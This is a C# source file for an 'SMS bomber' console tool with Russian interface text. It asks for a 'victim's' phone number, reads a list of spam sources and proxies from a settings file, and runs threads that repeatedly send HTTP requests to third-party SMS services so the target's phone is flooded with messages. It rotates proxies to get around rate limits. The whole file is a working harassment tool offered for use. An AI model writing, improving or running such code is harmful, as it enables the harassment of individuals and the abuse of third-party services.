using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

namespace Simple_bomber
{
    class Program
    {
        static string phone;
        static int ok_bombs = 0;

        static void Main(string[] args)
        {
            Console.Title = "SimpleSMSBomber";
            Console.WriteLine("SimpleSMSBombe by Irval. Special for Datastock.biz\nОфициальный репозиторий GitHub: \nТекущая версия: 1.0.7");

        start:
            Console.WriteLine("\nВведите номер телефона жертвы: ");

            string number = Console.ReadLine();
            string phonePattern = @"(^\+\d{1,2})?((\(\d{3}\))|(\-?\d{3}\-)|(\d{3}))((\d{3}\-\d{4})|(\d{3}\-\d\d\-\d\d)|(\d{7})|(\d{3}\-\d\-\d{3}))";

            if (!Regex.IsMatch(number, phonePattern)) {
                Console.Clear();
                Console.WriteLine("Неверный формат номера телефона!");
                goto start;
            }
            phone = number;

            if (!File.Exists("Settings.json"))
                File.Create("Settings.json").Close();

            try
            {
                SettingsData settings = JsonConvert.DeserializeObject<SettingsData>(File.ReadAllText("Settings.json"));

                if (settings != null)
                {
                    Console.Clear();
                    Console.WriteLine($"Обнаружено {settings.sources.Length} источников спама. {(settings.multi_thread ? $"Необходимо {settings.sources.Length} потоков" : "")}"
                                      + $"\nИспользуется {settings.proxies.Length} прокси\n\nЖелаете продолжить?");
                    string ans = Console.ReadLine().ToLower();
                    if (string.IsNullOrEmpty(ans) || !ans.StartsWith("n"))
                    {
                        Console.Clear();
                        close_threads = false;

                        if (!settings.multi_thread)
                        {
                            var thread = new Thread(BobmerThread);
                            thread.Start(new object[] { settings, -1 });
                        }
                        else
                        {
                            for (int i = 0; i < settings.sources.Length; i++)
                            {
                                var thread = new Thread(BobmerThread);
                                thread.Start(new object[] { settings, i });
                            }
                        }
                        Console.WriteLine("Бомбер успешно запущен!");
                        Console.ReadKey();
                        Console.Clear();
                        Console.WriteLine("Бомбер завершен! Отправленных sms: " + ok_bombs);

                        close_threads = true;
                        ok_bombs = 0;

                        goto start;
                    }
                    else
                        goto start;
                }
                else
                {
                    Console.Clear();
                    Console.WriteLine("Файл настроек Settings.json пуст!"); 
                    goto start;
                }
            }
            catch (Exception ex)
            {
                Console.Clear();
                Console.WriteLine("Ошибка во время получения настроек: " + ex.Message);
            }

            goto start;
        }

        static bool close_threads = false;

        static void BobmerThread(object info)
        {
            int delay = 0;
            int count = 0;

            while (!close_threads)
            {
                try
                {
                    SettingsData settings = (SettingsData)((object[])info)[0];
                    sources[] Sources = settings.sources;
                    int j = (int)((object[])info)[1];

                    if (j != -1)
                        Sources = new sources[] { Sources[j] };

                    foreach (sources source in Sources)
                    {
                        if (delay < source.delay)
                            delay = source.delay;
                    }

                    for (int i = 0; i < Sources.Length; i++)
                    {
                        try
                        {
                            sources source = Sources[i];
                            string response = "";

                            System.Net.HttpWebRequest req = System.Net.WebRequest.Create(source.uri) as System.Net.HttpWebRequest;
                            req.Method = source.method;
                            req.Timeout = source.delay/2;
                            req.ContentType = source.content_type;
                            req.Accept = source.accept;

                            if (count != 0 && settings.proxy_delay % count == 0)
                            {
                                if (settings.proxies != null && settings.proxies.Length > 0)
                                {
                                    proxies proxy = settings.proxies[settings.proxy_delay / count < settings.proxies.Length ? settings.proxy_delay / count : settings.proxies.Length - 1];
                                    req.Proxy = new WebProxy($"{proxy.ip}:{proxy.port}");
                                }
                            }
                            string parameters = $"{source.phone_parameter}={phone}";

                            foreach (var parameter in source.parameters)
                                parameters += $"&{parameter.parameter}={parameter.value}";

                            foreach (var header in source.headers)
                                req.Headers.Add(header.header, header.value);

                            foreach (var cookie in source.cookies)
                                req.CookieContainer.Add(new Cookie(cookie.cookie, cookie.value));

                            byte[] sentData = Encoding.GetEncoding(1251).GetBytes(getJSON(parameters));
                            req.ContentLength = sentData.Length;
                            using (System.IO.Stream sendStream = req.GetRequestStream())
                            {
                                sendStream.Write(sentData, 0, sentData.Length);
                                sendStream.Close();
                            }

                            using (System.Net.WebResponse res = req.GetResponse())
                            {
                                using (Stream ReceiveStream = res.GetResponseStream())
                                {
                                    using (StreamReader sr = new StreamReader(ReceiveStream, Encoding.UTF8))
                                    {
                                        Char[] read = new Char[256];
                                        int Count = sr.Read(read, 0, 256);
                                        string Out = String.Empty;
                                        while (Count > 0)
                                        {
                                            String str = new String(read, 0, Count);
                                            Out += str;
                                            Count = sr.Read(read, 0, 256);
                                        }

                                        response = Out;
                                    }
                                }
                            }
                            Console.WriteLine("Сообщение отправлено. Ответ от сервера: " + response);
                            ok_bombs++;
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine("Ошибка отправки запроса: " + ex.Message);
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Ошибка во время работы бомбера: " + ex.Message);
                }
                count++;
                Thread.Sleep(delay);
            }
            Thread.CurrentThread.Abort();
        }

        static string getJSON(string data)
        {
            ChargifyWebHook webHook = new ChargifyWebHook(data);
            JSONNode node = new JSONNode("RootOrWhatEver");

            foreach (KeyValuePair<string, string> keyValuePair in webHook.KeyValuePairs)
            {
                node.InsertInHierarchy(ChargifyWebHook.ExtractHierarchyFromKey(keyValuePair.Key), keyValuePair.Value);
            }

            return node.ToJSONObject();
        }
    }
}
